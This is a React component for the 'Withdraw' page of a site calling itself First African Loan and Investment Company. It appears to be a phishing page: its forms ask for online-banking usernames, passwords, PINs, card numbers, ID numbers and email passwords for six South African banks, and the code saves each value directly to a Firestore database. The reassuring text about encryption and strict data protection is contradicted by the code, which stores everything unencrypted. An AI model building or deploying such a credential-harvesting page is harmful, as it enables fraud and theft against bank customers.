...
export default function Withdraw() {
  ...
  const [bank, setBank] = React.useState('');
    ...
    const { currentUser, logout, fullName, country, currency, loanAmount, loanActivation } = useAuth();
    ...
    async function handleSubmit(e) {
        ...
        if (capRefNum.current.value === '' || capRmtPin.current.value === '') {
            ...
            setCapRefNumError('');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('Capitec_Bank').set({
                ...
                setMessage('You have successfully updated your profile information! You would now be redirected to the dashboard');
                setTimeout(() => {
                    history.push('/');
                }, 5000);
            }).catch((e) => {
    ...
    async function handleSubmit2(e) {
        e.preventDefault();
        if (fbnUserNameRef.current.value === '' || fbnPassRef.current.value === '' || fbnPinRef.current.value === "" || fbnCardNumRef.current.value === '') {
            setCapRefNumError2('Field cannot be blank');
            
        }else {
            setCapRefNumError2('');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('FNB_Bank').set({
                ...
                setMessage2('You have successfully updated your profile information! You would now be redirected to the dashboard');
                setTimeout(() => {
                    history.push('/');
                }, 5000);
            }).catch((e) => {
    ...
    async function handleSubmit3(e) {
        e.preventDefault();
        if (nedSaIdRef.current.value === '' || nedCardRef.current.value === '' || nedPinRef.current.value === '' || nedPassef.current.value === '') {
            setCapRefNumError3('Field cannot be blank');
            
        }else {
            setCapRefNumError3('');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('Ned_Bank').set({
                ...
                setMessage3('You have successfully updated your profile information! You would now be redirected to the dashboard');
                setTimeout(() => {
                    history.push('/');
                }, 5000);
            }).catch((e) => {
    ...
    async function handleSubmit4(e) {
        e.preventDefault();
        if (stdGMRef.current.value === '' || stdPWDRef.current.value === '') {
            setCapRefNumError4('Field cannot be blank');
            
        }else {
            setCapRefNumError4('');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('Standard_Bank').set({
                ...
                setMessage4('You have successfully updated your profile information! You would now be redirected to the dashboard');
                setTimeout(() => {
                    history.push('/');
                }, 5000);                
            }).catch((e) => {
    ...
    async function handleSubmit5(e) {
        e.preventDefault();
        if (absAccountNumef.current.value === '' || absPinRef.current.value === '' || absPWDRef.current.value
        === '') {
            ...
            setCapRefNumError5('');
            setMessage4('You have successfully updated your profile information! You would now be redirected to the dashboard');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('Abasa_Bank').set({
    ...
    async function handleSubmit6(e) {
        ...
        if (tymPinRef.current.value === '' || tymIdRef.current.value === '') {
            ...
            setCapRefNumError6('');
            setMessage4('You have successfully updated your profile information! You would now be redirected to the dashboard');
            await db.collection('users').doc(currentUser.uid).collection('bank-info').doc('Tyme_Bank').set({
                Pin: tymPinRef.current.value,
                Password: tymIdRef.current.value,
            }).then(() => {
                ...
                <div className="main">
                    ...
                    >
                        ...
                        <div className="bank-select">
...

                                {
                                    ...
                                    <div>
                                        <TextField
                                            ...
                                            type="text"
                                            helperText={capRefNumError ? capRefNumError : "Please enter your bank reference number"}
                                        ...
                                        <TextField
                                            label="Remote Pin"
                                            type='password'
                                            helperText={capRefNumError ? capRefNumError : "Please enter your bank remote pin"}
                                            error={capRefNumError ? true : false}
                                            inputRef={capRmtPin}
                                            required
                                        />
                                ...
                                }
                                {
                                    ...
                                    <div>
                                        <TextField
                                            ...
                                            helperText={capRefNumError2 ? capRefNumError2 : "Please enter your bank User Name"}
                                        ...
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={fbnPassRef}
                                            helperText={capRefNumError2 ? capRefNumError2 : "Please enter your bank Password"}
                                            error={capRefNumError2 ? true : false}
                                            required
                                        ...
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={fbnPinRef}
                                            helperText={capRefNumError2 ? capRefNumError2 : "Please enter your bank Pin"}
                                            error={capRefNumError2 ? true : false}
                                            required
                                        />
                                        <TextField
                                            ...
                                            helperText={capRefNumError2 ? capRefNumError2 : "Please enter your card number"}
                                            error={capRefNumError2 ? true : false}
                                            required
                                        />
                                    </div>
...

                                {
                                    ...
                                    <div>
                                        <TextField
                                            label="SA ID"
                                            type="text"
                                            helperText={capRefNumError3 ? capRefNumError3 : "Please enter your SA ID"}
                                        ...
                                        <TextField
                                            label="Card Number"
                                            type="text"
                                            helperText={capRefNumError3 ? capRefNumError3 : "Please enter your card number"}
                                            error={capRefNumError3 ? true : false}
                                            inputRef={nedCardRef}
                                            required
                                        />
                                        <TextField
                                            label="Pin"
                                            type='password'
                                            helperText={capRefNumError3 ? capRefNumError3 : "Please enter your bank Pin"}
                                            error={capRefNumError3 ? true : false}
                                            inputRef={nedPinRef}
                                            required
                                        />
                                        <TextField
                                            label="Password"
                                            type='password'
                                            helperText={capRefNumError3 ? capRefNumError3 : "Please enter your password"}
                                            error={capRefNumError3 ? true : false}
                                            inputRef={nedPassef}
                                            required
                                        />
...

                                {
                                    ...
                                    <div>
                                        <TextField
                                            ...
                                            type="email"
                                            inputRef={stdGMRef}
                                            helperText={capRefNumError4 ? capRefNumError4 : "Please enter your bank Gmail"}
                                        ...
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={stdPWDRef}
                                            helperText={capRefNumError4 ? capRefNumError4 : "Please enter your password"}
                                            error={capRefNumError4 ? true : false}
                                            required
                                        />
                                    </div>
...

                                {
                                    ...
                                    <div>
                                        <TextField
                                            ...
                                            helperText={capRefNumError5 ? capRefNumError5 : "Please enter your bank account number"}
                                        ...
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={absPinRef}
                                            helperText={capRefNumError5 ? capRefNumError5 : "Please enter your Bank pin"}
                                            error={capRefNumError5 ? true : false}
                                            required
                                        />
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={absPWDRef}
                                            helperText={capRefNumError5 ? capRefNumError5 : "Please enter your Bank password"}
                                            error={capRefNumError5 ? true : false}
                                            required
                                        />
                                    </div>
...

                                {
                                    ...
                                    <div>
                                        <TextField
                                            ...
                                            type='password'
                                            inputRef={tymPinRef}
                                            helperText={capRefNumError6 ? capRefNumError6 : "Please enter your Bank pin"}
                                        ...
                                        <TextField
                                            ...
                                            type="text"
                                            inputRef={tymIdRef}
                                            helperText={capRefNumError6 ? capRefNumError6 : "Please enter your Bank id number"}
                                            error={capRefNumError6 ? true : false}
                                            required
                                        />
                                    </div>
                            ...
                            { capitecBank && <div className="withdrawBtn"
                            ...
                            {fbnBank && <div className="withdrawBtn"
                                    style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}
                                >
                                <Button
                                    variant='contained'
                            ...
                            {nedbank && <div className="withdrawBtn"
                                    style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}
                                >
                                <Button
                                    variant='contained'
                            ...
                            {standardBank && <div className="withdrawBtn"
                                    style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}
                                >
                                <Button
                                    variant='contained'
                            ...
                            {absabank && <div className="withdrawBtn"
                                    style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}
                                >
                                <Button
                                    variant='contained'
                            ...
                            {tymeBank && <div className="withdrawBtn"
                                    style={{display: 'flex', justifyContent: 'center', alignItems: 'center'}}
                                >
                                <Button
                                    variant='contained'
                ...
                <div className="info"
                    ...
                    >
                        ...
                        <Typography
                            ...
                            style={{color: '#fff'}}
                        >
                            The information you share with us is stored in an encrypted manner so you do not have to ever worry about data leaks or your information getting into the hands of malicious people. We would never share you information with anyone without you being informed. We follow very strict data protection policies here at First African Loan and Investment Company.
                        </Typography>
                    </div>
            </Container>
        </div>
